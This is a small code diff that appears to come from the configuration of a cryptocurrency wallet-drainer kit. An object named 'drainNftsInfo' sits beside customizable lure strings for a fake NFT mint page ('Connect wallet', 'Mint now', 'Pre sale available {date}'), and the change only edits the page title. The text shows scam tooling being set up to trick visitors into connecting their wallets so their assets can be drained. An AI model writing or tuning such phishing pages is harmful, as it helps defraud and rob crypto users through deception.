@@ -33,7 +33,7 @@ const drainNftsInfo = {
 }
 
 const customStrings = {
-    title: "MINT {BNB}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    title: "MINT", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     connectButton: "Connect wallet",
     transferButton: "Mint now",
     dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
